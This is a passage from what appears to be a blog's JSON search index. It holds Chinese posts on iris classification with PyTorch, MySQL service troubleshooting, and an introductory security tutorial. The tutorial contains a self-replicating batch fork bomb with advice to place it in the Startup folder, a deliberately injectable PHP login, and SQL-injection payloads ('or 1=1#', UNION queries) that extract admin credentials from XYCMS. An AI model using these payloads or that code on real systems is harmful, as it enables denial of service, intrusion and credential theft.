1, 1, 1, 1, 1, 1, 1, ​ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, ​ 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, ​ 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, ​ 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2]), ‘frame’: None, ‘target_names’: array([‘setosa’, ‘versicolor’, ‘virginica’], dtype=’&lt;U10’),’DESCR’:……’filename’: ‘C:\\Users\\zky666\\.conda\\envs\\pytorch\\lib\\site-packages\\sklearn\\datasets\\data\\iris.csv’} 调用pandas库，读取iris中data数据，存储在pandas中DataFrame数据结构中，列标签分别为：Sepal_Length,Sepal_Width,Petal_length,Petal_Width 1iris_d = pd.DataFrame(iris['data'], columns=['Sepal_Length', 'Sepal_Width', 'Petal_Length', 'Petal_Width']) DataFrame的数据格式为： ​ Sepal_Length Sepal_Width Petal_Length Petal_Width 0 5.1 3.5 1.4 0.2 1 4.9 3.0 1.4 0.2 2 4.7 3.2 1.3 0.2 3 4.6 3.1 1.5 0.2 4 5.0 3.6 1.4 0.2 .. … … … … 145 6.7 3.0 5.2 2.3 146 6.3 2.5 5.0 1.9 147 6.5 3.0 5.2 2.0 148 6.2 3.4 5.4 2.3 149 5.9 3.0 5.1 1.8 按照种类，将每个品种的花单独划分为一个分类 12345iris_d['Species'] = iris.targetiris_class1 = iris_d[iris_d[&quot;Species&quot;]==0]iris_class2 = iris_d[iris_d[&quot;Species&quot;]==1]iris_class3 = iris_d[iris_d[&quot;Species&quot;]==2] Sepal_Length Sepal_Width Petal_Length Petal_Width Species 0 5.1 3.5 1.4 0.2 0 1 4.9 3.0 1.4 0.2 0 2 4.7 3.2 1.3 0.2 0 .. … … … … … 148 6.2 3.4 5.4 2.3 2 149 5.9 3.0 5.1 1.8 2 [150 rows x 5 columns] Sepal_Length Sepal_Width Petal_Length Petal_Width Species 0 5.1 3.5 1.4 0.2 0 1 4.9 3.0 1.4 0.2 0 …… 48 5.3 3.7 1.5 0.2 0 49 5.0 3.3 1.4 0.2 0 分析参数两两之间的关系 1234567891011import itertoolsplt.figure(figsize=(15, 10))t = 1for i, j in list(itertools.combinations(['Sepal_Length', 'Sepal_Width', 'Petal_Length', 'Petal_Width'], 2)): plt.subplot(2, 3, t) plt.scatter(iris_class1[i], iris_class1[j], 15 , c = 'r') plt.scatter(iris_class2[i], iris_class2[j], 15 , c = 'g') plt.scatter(iris_class3[i], iris_class3[j], 15 , c = 'b') t += 1 plt.title(str(i) + ' + ' + str(j))plt.show() 结果： 结论： 只有Sepal_Length和Sepal_Width不能很好的分类，其他几项还算是不错 分析三个参数之间的关系 12345678910111213141516171819202122232425262728import itertoolsfrom mpl_toolkits.mplot3d import Axes3Dfig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Sepal_Width'], iris_class1['Petal_Length'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Sepal_Width'], iris_class1['Petal_Length'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Sepal_Width'], iris_class1['Petal_Length'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Sepal_Width'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Sepal_Width'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Sepal_Width'], iris_class1['Petal_Width'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Length'], iris_class1['Petal_Length'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Length'], iris_class2['Petal_Length'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Length'], iris_class3['Petal_Length'], iris_class1['Petal_Width'], c = 'b')fig = plt.figure(figsize=(7, 5))ax = Axes3D(fig)ax.scatter(iris_class1['Sepal_Width'], iris_class1['Petal_Length'], iris_class1['Petal_Width'], c = 'r')ax.scatter(iris_class2['Sepal_Width'], iris_class2['Petal_Length'], iris_class1['Petal_Width'], c = 'g')ax.scatter(iris_class3['Sepal_Width'], iris_class3['Petal_Length'], iris_class1['Petal_Width'], c = 'b')plt.show() Sepal_Length + Sepal_Width + Petal_Length： Sepal_Length + Sepal_Width + Petal_Width： Sepal_Length + Petal_Length + Petal_Width： Sepal_Width + Petal_Length + Petal_Width： 结论：其中Sepal_Length + Petal_Length + Petal_Width和Sepal_Width + Petal_Length + Petal_Width分类效果较好 综上所述Petal_Length + Petal_Width在分类中相对有较大影响，因此在后续的数据处理中可能会对原始数据进行降维处理 利用PCA进行降维 调用skleaen.decomposition中PCA函数进行降维 123transfer_1 = PCA(n_components=2)iris_d = transfer_1.fit_transform(iris_d)print(iris_d) 划分训练集与测试集 随机打乱数据（因为原始数据是顺序的，顺序不打乱会影响准确率），并将前120行作为训练集，后30行作为测试集 12345678910111213141516iris_x_numpy = np.array(iris_d)# print(iris_d)np.random.seed(120)np.random.shuffle(iris_x_numpy)x_train = iris_x_numpy[:-30]x_test = iris_x_numpy[-30:]x_train_tensor = torch.tensor(x_train)x_test_tensor = torch.tensor(x_test)# print(iris_x_tensor)iris_numpy_y = np.array(iris.target)np.random.seed(120)np.random.shuffle(iris_numpy_y)y_train = iris_numpy_y[:-30]y_test = iris_numpy_y[-30:]y_train_tensor = torch.tensor(y_train)y_test_tensor = torch.tensor(y_test) 将pandas.DataFrame 转成 torch.tensor 1234x_train_tensor = torch.tensor(x_train)x_test_tensor = torch.tensor(x_test)y_train_tensor = torch.tensor(y_train)y_test_tensor = torch.tensor(y_test) 将Tensor转换为Variable，装载梯度信息 12345x_train_V = Variable(x_train_tensor)x_test_V = Variable(x_test_tensor)y_train_V = Variable(y_train_tensor)y_test_V = Variable(y_test_tensor)print(&quot;y_test_V&quot;, y_test_V) 利用pytorch框架构建BP神经网络模型 12345net = torch.nn.Sequential( torch.nn.Linear(2, 10), torch.nn.ReLU(), torch.nn.Linear(10, 3),) 选择损失值求解算法 1loss_func = torch.nn.CrossEntropyLoss() # the target label is NOT an one-hotted 构造优化器optimizer 123# optimizer = torch.optim.SGD(net.parameters(), lr=0.5) # 随机梯度下降optimizer = torch.optim.ASGD(net.parameters(), lr=0.5, lambd=0.0001, alpha=0.75, t0=1000000.0, weight_decay=0) # 随机梯度下降 训练模型 1234567891011lost_step = []accyracy_list = []for t in range(100): out = net(x_train_V.float()) # input x and predict based on x loss = loss_func(out, y_train_V.long()) # must be (1. nn output, 2. target), the target label is NOT one-hotted print(&quot;loss:&quot;, loss.detach().numpy()) lost_step.append(loss) optimizer.zero_grad() # clear gradients for next train loss.backward() # backpropagation, compute gradients optimizer.step() # apply gradients 检验模型，计算准确率+画图 12345678910111213141516171819202122232425262728293031323334if t % 10 == 0: # plot and show learning process plt.cla() prediction = torch.max(out, 1)[1] print(prediction) pred_y = prediction.data.numpy() print(pred_y) target_y = y_train_V.data.numpy() # print(x) print(x_train_V.data.numpy()[:, 0]) x1_min, x1_max = x_train_V[:, 0].min(), x_train_V[:, 0].max() x2_min, x2_max = x_train_V[:, 1].min(), x_train_V[:, 1].max() plt.scatter(x_train_V.data.numpy()[:, 0], x_train_V.data.numpy()[:, 1], c=pred_y, s=100, lw=0, cmap='RdYlGn') # plt.legend() plt.xlim(x1_min, x1_max) plt.ylim(x2_min, x2_max) y_test_pred = net(x_test_V.float()) prediction_y = torch.max(y_test_pred, 1)[1] pred_y_test = prediction_y.data.numpy() print(&quot;pred_y_test:&quot;, pred_y_test) y_test_target = y_test_V.data.numpy() print(&quot;y_test_target:&quot;, y_test_target) accuracy = float((pred_y_test == y_test_target).astype(int).sum()) / float(y_test_target.size) accyracy_list.append(accuracy) print(accuracy) plt.text(2.3, -1.5, 'Accuracy=%.2f' % accuracy, fontdict={'size': 15, 'color': 'red'}) plt.pause(0.1) 当lr = 0.2时 训练10次： 训练20次： 训练30次： 训练40次： 训练90次： 训练100次： 损失值与测试集准确率变化曲线 当lr = 0.5时 第10次训练： 第20次训练： 第30次训练： 第50次训练： 第100次训练： 损失值与测试集准确率变化曲线 动态更新学习率： 1optimizer = torch.optim.ASGD(net.parameters(), lr=0.5, lambd=0.0001, alpha=0.75, t0=1000000.0, weight_decay=0) 第10次训练： 第20次训练： 第30次训练： 第100次训练： 损失值与测试集准确率变化曲线：","link":"/2021/07/31/%E5%9F%BA%E4%BA%8E%E5%89%8D%E9%A6%88%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AF%B9iris%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E7%B1%BB/"},{"title":"环回接口","text":"","link":"/2021/12/01/%E7%8E%AF%E5%9B%9E%E6%8E%A5%E5%8F%A3/"},{"title":"网络安全必会","text":"信息安全介绍信息安全三要素（CIA）： 保密性 完整性 可用性 信息安全的主要方向 业务可靠性 技术服务 安全渗透 安全服务 护网行动 攻击方 防守方 死循环代码 .bat 可以关机版本 1234%0|%0%0执行自身，有32层递归深度| 管道符，前面代码执行失败执行后面代码 关机不了版本 123456789:Astartstartstartstartstartgoto A 有破坏性版本 123C:\\Users\\administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup开启自启动设置 安全模式：开机时疯狂按F8 Linux命令: pwd ls cd mkdir rm -rf cp -rf mv touch cat vim chmod -R firewall-cmd –add-service=http firewall-cmd –add-port=80/tcp firewall-cmd –list-all yum tree -C systemctl start unzip 漏洞的发现web Web（World Wide Web）即全球广域网，也称为万维网。 我们常说的 Web端 就是网页端。 网页 网页是构成网站的基本元素。网页主要由文字、图像和超链接等元素构成。当然，除了这些元素，网页中还可 以包含音频、视频以及Flash等。 我们在浏览器上输入网址后，打开的任何一个页面，都是属于网页。 浏览器 浏览器是网页运行的平台，常见的浏览器有谷歌（Chrome）、Safari、火狐（Firefox）、IE、Edge、Opera 等。 HTML相当于身体结构 CSS相当于人的衣服和打扮 JavaScript相当于人的行为 标签： div：规范格式，决定界面样式 form：可以包含很多 action=# 谁都不提交 登录页面编写网页框架使用html快速写出一个需要输入用户名和密码的登录框，网页文件名就叫 index.html 123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;main&quot;&gt; &lt;form action=&quot;#&quot; method=&quot;POST&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;span class=&quot;photo&quot;&gt;&lt;/span&gt;&lt;/li&gt; &lt;li&gt; &lt;input type=&quot;text&quot; id='username' required&gt; &lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;password&quot; id='password' required&gt; &lt;label for=&quot;password&quot;&gt;密码&lt;/label&gt; &lt;/li&gt; &lt;li&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 此时这个页面打开之后是很丑的 为登录框添加样式样式文件名就叫 style.css 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495* {margin: 0;padding: 0;}body {background: #333;}.main {width: 400px;height: 600px;position: absolute;left: 50%;top: 50%;transform: translate(-50%,-50%);border: 1px solid gray;border-radius: 25px;display: flex;justify-content: center;align-items: center;}ul {width: 100%;list-style-type: none;}li {width: 100%;margin-bottom: 25px;position: relative;display: flex;justify-content: center;}li span.photo {background: url(&quot;logo.jpg&quot;);background-size: cover;border-radius: 50%;border: 1px solid white;width: 300px;height: 300px;}li input {width: 80%;display: block;box-sizing: border-box;height: 30px;left: 0;top: 0;background: transparent;border: none;outline: none;color: white;font-size: 25px;}li label {width: 80%;display: block;position: absolute;bottom: 0;color: gray;padding-left: 15px;pointer-events: none;border-bottom: 1px solid white;padding-bottom: 10px;transition: 0.5s linear;}li a {color: white;font-size: 20px;text-decoration: none;text-transform: uppercase;padding: 10px;border-bottom: 1px solid white;transition: 0.2s linear;}li a:hover {/* color:#1e99ff; */border-color: #1e99ff;text-shadow: 0 0 3px #1e99ff, 0 0 6px #1e99ff, 0 0 12px #1e99ff;}li input:focus~label,li input:valid~label {border-color: #1e99ff;color: #1e99ff;padding-bottom: 30px;font-size: 10px;} 在html的 head 标签中引用我们写好的样式 1&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; 在源码所在的文件夹添加头像文件 logo.jpg 然后就可以看到网页被美化了 写后端程序实现登录功能首先要确保前端提交的数据能够传给后端应用程序，所以我们需要对参数进行命名，给用户名命名为 username 给密码命名为 password 1234567891011# form标签中添加后端程序的访问路径&lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;# index.html文件中改成如下，在input标签中加上name&lt;li&gt;&lt;input type=&quot;text&quot; id='username' name='username' required&gt;&lt;label for=&quot;username&quot;&gt;用户名&lt;/label&gt;&lt;/li&gt;&lt;li&gt;&lt;input type=&quot;password&quot; id='password' name='password' required&gt;&lt;label for=&quot;password&quot;&gt;密码&lt;/label&gt;&lt;/li&gt; 创建数据库，用于保存登录的用户名和密码 1234567891011121314151617181920212223# 创建数据库名为abcmysql&gt; create database abc;Query OK, 1 row affected (0.00 sec)# 进入数据库abcmysql&gt; use abcDatabase changed# 创建admin表，并且指定两列username和passwordmysql&gt; insert into admin values('user01','123456'),('user02','654321');Query OK, 2 rows affected (0.00 sec)Records: 2 Duplicates: 0 Warnings: 0# 插入两个用户的数据mysql&gt; insert into admin values('user01','123456'),('user02','654321');Query OK, 2 rows affected (0.00 sec)Records: 2 Duplicates: 0 Warnings: 0# 查看刚刚插入的数据mysql&gt; select * from admin;+----------+----------+| username | password |+----------+----------+| user01 | 123456 || user02 | 654321 |+----------+----------+2 rows in set (0.00 sec) 编写后端程序代码，后端程序文件名为 login.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php $host='localhost'; $database='abc'; $user='root'; $pass='usbw'; $conn=mysql_connect($host,$user,$pass) or die('数据库连接出错！'); $select_db=mysql_select_db($database,$conn); if(!$select_db){ echo &quot;无相关数据库！&quot;; } $flag='未登录！'; $sql=''; if(isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])){ $username = trim($_POST[&quot;username&quot;]); $password = trim($_POST[&quot;password&quot;]); $sql = &quot;select * from admin where username='&quot;.$username.&quot;' andpassword='&quot;.$password.&quot;'&quot;; $result = mysql_query($sql); if(!mysql_num_rows($result)==0){ $flag=&quot;登录成功！&quot;; }else{ $flag=&quot;登录失败&quot;; } }?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;&lt;?php echo $flag; ?&gt;&lt;/h1&gt; &lt;p&gt;&lt;?php echo $sql;?&gt;&lt;/p&gt; &lt;p&gt;&lt;?php echo mysql_error();?&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 测试登录成功界面 登录失败页面 直接访问页面 安全问题密码安全如果黑客将服务器破解，就可以在服务器数据库里面直接看到用户的明文密码 我们登录的所有信息都是明文在互联网上传输，如果有黑客在网络上对数据进行监听，那很有可能黑客就直接 能得到我们的密码 比如我们尝试着抓取登录时候的数据包，我们可以清楚的看到用户名和密码相关信息 我们可以使用md5散列函数对密码进行保护，这样我们就不需要将密码发往服务器，只需要往服务器发送密码 的数据指纹即可，这么做并不会阻止黑客登录当前网站，但是却可以防止黑客拿到你的真实密码，从而威胁到你的别的网站的账号安全。 修改html，在其中加入支持md5的javascript代码，并且在输入完密码之后，就将明文密码改为md5散列值 12345678// 以下代码是加在index.html的body结尾&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js&quot;&gt;&lt;/script&gt;&lt;script&gt;$(&quot;#password&quot;).blur((function() {$(&quot;#password&quot;).val(md5($(&quot;#password&quot;).val()));}))&lt;/script&gt; 下面去修改数据库，将原本的密码改为md5的散列值 12345678910111213141516171819# 首先要修改password的长度，上面定义的时候只给了20位的长度mysql&gt; alter table admin modify password varchar(32);Query OK, 2 rows affected (0.03 sec)Records: 2 Duplicates: 0 Warnings: 0# 然后更改数据mysql&gt; update admin set password=md5('123456') where username='user01';Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 1mysql&gt; update admin set password=md5('654321') where username='user02';Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 1mysql&gt; select * from admin;+----------+----------------------------------+| username | password |+----------+----------------------------------+| user01 | e10adc3949ba59abbe56e057f20f883e || user02 | c33367701511b4f6020ec61ded352059 |+----------+----------------------------------+2 rows in set (0.00 sec) 再次尝试登录用户，可以看到密码已经变成散列值了，黑客没法通过数据库或者数据抓包得到原始的密码 程序的安全判断是否登录成功的逻辑是这样的，执行如下语句 12select * from admin where username='user01' andpassword='e10adc3949ba59abbe56e057f20f883e' 如果在数据库中能够有匹配的查询结构，就判定为登录成功，这样的判断逻辑是没错的。 但是当我们尝试输入如下用户名和密码的时候，一样能登录成功。 用户名：' or 1=1# 密码随便输入 其中 # 号是sql语句的注释，等于这句sql语句变成了 1select * from admin where username='' or 1=1 而 username='' 是一定不成立的，但是1=1是一定成立的，所以where的条件总是为真，导致这个语句一定 能查出所有的数据 这样无论如何都能登录成功，所以 ' or 1=1# 也被称为万能密码，因为在任何没有防护的系统上都能登录成 功。 而这种利用漏洞执行用户自定义SQL语句的入侵方式，被称为SQL注入 SQL注入常用命令 mysql -uroot -p show databases; create database student; use student; create table result(id int(8),name varchar(20),city varchar(20),score int(5)); insert into result(id,name,city,score) values(1,”wang”,”beijing”,75); select * from result; select name,score from result; select score from result where name=”li”; select * from result order by score desc; delete from result where id=7; update result set score=60 where id=5; ==select id,name,score from result order by 1;== 1select c1,c2,...,cn from result order by M; order by后面的数字（M）必须小于或等于n（数据库查询的字段数），才能正常显示。如果M&gt;n，数据库就会 报错。可以利用这个特点判断数据库查询的字段数。 select * from result limit 0,2; select * from result union select 1,2,3,4; select id,name,score from result union select 1,2,3; 1select c1,c2,...,cn from result union select d1,d2,...dm; 后半句union select查询的字段数（m）必须与前半句select查询的字段数（n）相等，数据库才能正常显示结 果。与order by相似，可以利用这个特点判断数据库查询的字段数。 12select id,city from result where id=1 and 1=2 union select name,score fromresult; 从以上结果可以总结，在已知字段名的情况下，攻击者只要将该字段置于任何能够显示的位置，就可以暴露该 字段的值。 MySQL（MariaDB）5.5以上版本自带information_schema数据库，其中保存着关于MySQL服务器所维护的所 有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。可以把 information_schema数据库看作MySQL（MariaDB）的“目录”！ （1）尝试执行以下两条语句： 123show databases；select schema_name from information_schema.schemata; 两条语句执行结果相同！ （2）尝试执行以下两组语句： 第一组： 123use student;show tables; 第二组： 1select table_name from information_schema.tables where table_schema='student'; information_schema使用 已知数据库查询表 1select table_name from information_schema.tables where table_schema='student'; 已知表查询列 1select column_name from information_schema.columns where table_name='result'; 查询列中数据 1select name,score from result; mysql常用函数 12345678910system_user() 系统用户名user() 用户名current_user 当前用户名session_user() 连接数据库的用户名database() 数据库名version() MYSQL数据库版本load_file() 转成16进制或者是10进制MYSQL读取本地文件的函数@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统 实战案例使用案例为XYCMS 联合查询 可以爆出非数字类型的列 1and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10 爆出所xycms所有的表 12and 1=2 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8,9,10 frominformation_schema.tables where table_schema='xycms' 防止单引号过滤可以将数据库名转为16进 12and 1=2 UNION SELECT 1,group_concat(table_name),3,4,5,6,7,8,9,10 frominformation_schema.tables where table_schema=0x7879636D73 爆出列名 12and 1=2 UNION SELECT 1,group_concat(column_name),3,4,5,6,7,8,9,10 frominformation_schema.columns where table_name='manage_user' 爆出用户名和密码 12and 1=2 UNION SELECT 1,group_concat(m_name,0x5c,m_pwd),3,4,5,6,7,8,9,10 frommanage_user 探测数据库名 1php?id = -13 union select 1,2,3,4,5,6,7,database(),9,0 inurl php?id=汽车 id=8 order by 3–+ –也是注释 网址里+会转成空格 select * from xy_pro where id=13; 黑客工具使用显错注入","link":"/2021/09/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/"},{"title":"Centos7中的启动MySQL出现问题及解决方案","text":"当输入命令 1~]# systemctl start mysql.service 得到： 12Failed to start mysql.service: Unit is not loaded properly: Bad message.See system logs and 'systemctl status mysql.service' for details. 说明启动不成功 1~]# systemctl status mysql.service 123456789101112131415 mysql.service Loaded: error (Reason: Bad message) Active: inactive (dead)9月 07 23:16:39 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:18:27 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:19:55 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....9月 07 23:30:00 server1 systemd[1]: [/etc/systemd/system/mysql.s....Hint: Some lines were ellipsized, use -l to show in full. 然而/etc/systemd/system/mysql.service的文件如下： 1234567891011121314cat &gt;/etc/systemd/system/mysql.service &lt;&lt;EOF[unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlExecStart=/application/mysql/bin/mysqld --defaults-file=/etc/my.cnfLimitNOFILE = 5000 查看日志 cat /data/mysql/data/hostname.err 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771782021-09-07T14:37:07.202054Z 0 [Warning] TIMESTAMP with implicit DEFAULT value is deprecated. Please use --explicit_defaults_for_timestamp server option (see documentation for more details).2021-09-07T14:37:07.202124Z 0 [Note] --secure-file-priv is set to NULL. Operations related to importing and exporting data are disabled2021-09-07T14:37:07.202142Z 0 [Note] /application/mysql/bin/mysqld (mysqld 5.7.26) starting as process 11278 ...2021-09-07T14:37:07.255263Z 0 [Note] InnoDB: PUNCH HOLE support available2021-09-07T14:37:07.255281Z 0 [Note] InnoDB: Mutexes and rw_locks use GCC atomic builtins2021-09-07T14:37:07.255284Z 0 [Note] InnoDB: Uses event mutexes2021-09-07T14:37:07.255287Z 0 [Note] InnoDB: GCC builtin __sync_synchronize() is used for memory barrier2021-09-07T14:37:07.255289Z 0 [Note] InnoDB: Compressed tables use zlib 1.2.112021-09-07T14:37:07.255291Z 0 [Note] InnoDB: Using Linux native AIO2021-09-07T14:37:07.255464Z 0 [Note] InnoDB: Number of pools: 12021-09-07T14:37:07.255535Z 0 [Note] InnoDB: Using CPU crc32 instructions2021-09-07T14:37:07.257236Z 0 [Note] InnoDB: Initializing buffer pool, total size = 128M, instances = 1, chunk size = 128M2021-09-07T14:37:07.263139Z 0 [Note] InnoDB: Completed initialization of buffer pool2021-09-07T14:37:07.264802Z 0 [Note] InnoDB: If the mysqld execution user is authorized, page cleaner thread priority can be changed. See the man page of setpriority().2021-09-07T14:37:07.323740Z 0 [Note] InnoDB: Highest supported file format is Barracuda.2021-09-07T14:37:07.419956Z 0 [Note] InnoDB: Creating shared tablespace for temporary tables2021-09-07T14:37:07.420077Z 0 [Note] InnoDB: Setting file './ibtmp1' size to 12 MB. Physically writing the file full; Please wait ...2021-09-07T14:37:07.431712Z 0 [Note] InnoDB: File './ibtmp1' size is now 12 MB.2021-09-07T14:37:07.432597Z 0 [Note] InnoDB: 96 redo rollback segment(s) found. 96 redo rollback segment(s) are active.2021-09-07T14:37:07.432605Z 0 [Note] InnoDB: 32 non-redo rollback segment(s) are active.2021-09-07T14:37:07.433583Z 0 [Note] InnoDB: 5.7.26 started; log sequence number 25249852021-09-07T14:37:07.434612Z 0 [Note] InnoDB: Loading buffer pool(s) from /data/mysql/data/ib_buffer_pool2021-09-07T14:37:07.434876Z 0 [Note] Plugin 'FEDERATED' is disabled.2021-09-07T14:37:07.519839Z 0 [Warning] Failed to set up SSL because of the following SSL library error: SSL context is not usable without certificate and private key2021-09-07T14:37:07.519865Z 0 [Note] Server hostname (bind-address): '*'; port: 33062021-09-07T14:37:07.520761Z 0 [Note] IPv6 is available.2021-09-07T14:37:07.520781Z 0 [Note] - '::' resolves to '::';2021-09-07T14:37:07.520800Z 0 [Note] Server socket created on IP: '::'.2021-09-07T14:37:07.531657Z 0 [Note] InnoDB: Buffer pool(s) load completed at 210907 22:37:072021-09-07T14:37:07.620858Z 0 [Note] Failed to start slave threads for channel ''2021-09-07T14:37:07.768594Z 0 [Note] Event Scheduler: Loaded 0 events2021-09-07T14:37:07.769182Z 0 [Note] /application/mysql/bin/mysqld: ready for connections.Version: '5.7.26' socket: '/tmp/mysql.sock' port: 3306 MySQL Community Server (GPL)2021-09-07T14:39:03.314273Z 0 [Note] Giving 0 client threads a chance to die gracefully2021-09-07T14:39:03.314316Z 0 [Note] Shutting down slave threads2021-09-07T14:39:03.314324Z 0 [Note] Forcefully disconnecting 0 remaining clients2021-09-07T14:39:03.314329Z 0 [Note] Event Scheduler: Purging the queue. 0 events2021-09-07T14:39:03.314451Z 0 [Note] Binlog end2021-09-07T14:39:03.314877Z 0 [Note] Shutting down plugin 'ngram'2021-09-07T14:39:03.314886Z 0 [Note] Shutting down plugin 'BLACKHOLE'2021-09-07T14:39:03.314890Z 0 [Note] Shutting down plugin 'ARCHIVE'2021-09-07T14:39:03.314892Z 0 [Note] Shutting down plugin 'partition'2021-09-07T14:39:03.314894Z 0 [Note] Shutting down plugin 'INNODB_SYS_VIRTUAL'2021-09-07T14:39:03.314897Z 0 [Note] Shutting down plugin 'INNODB_SYS_DATAFILES'2021-09-07T14:39:03.314899Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESPACES'2021-09-07T14:39:03.314901Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN_COLS'2021-09-07T14:39:03.314913Z 0 [Note] Shutting down plugin 'INNODB_SYS_FOREIGN'2021-09-07T14:39:03.314915Z 0 [Note] Shutting down plugin 'INNODB_SYS_FIELDS'2021-09-07T14:39:03.314917Z 0 [Note] Shutting down plugin 'INNODB_SYS_COLUMNS'2021-09-07T14:39:03.314919Z 0 [Note] Shutting down plugin 'INNODB_SYS_INDEXES'2021-09-07T14:39:03.314921Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLESTATS'2021-09-07T14:39:03.314923Z 0 [Note] Shutting down plugin 'INNODB_SYS_TABLES'2021-09-07T14:39:03.314926Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_TABLE'2021-09-07T14:39:03.314928Z 0 [Note] Shutting down plugin 'INNODB_FT_INDEX_CACHE'2021-09-07T14:39:03.314931Z 0 [Note] Shutting down plugin 'INNODB_FT_CONFIG'2021-09-07T14:39:03.314932Z 0 [Note] Shutting down plugin 'INNODB_FT_BEING_DELETED'2021-09-07T14:39:03.314934Z 0 [Note] Shutting down plugin 'INNODB_FT_DELETED'2021-09-07T14:39:03.314936Z 0 [Note] Shutting down plugin 'INNODB_FT_DEFAULT_STOPWORD'2021-09-07T14:39:03.314938Z 0 [Note] Shutting down plugin 'INNODB_METRICS'2021-09-07T14:39:03.314939Z 0 [Note] Shutting down plugin 'INNODB_TEMP_TABLE_INFO'2021-09-07T14:39:03.314941Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_POOL_STATS'2021-09-07T14:39:03.314942Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE_LRU'2021-09-07T14:39:03.314944Z 0 [Note] Shutting down plugin 'INNODB_BUFFER_PAGE'2021-09-07T14:39:03.314946Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX_RESET'2021-09-07T14:39:03.314947Z 0 [Note] Shutting down plugin 'INNODB_CMP_PER_INDEX'2021-09-07T14:39:03.314949Z 0 [Note] Shutting down plugin 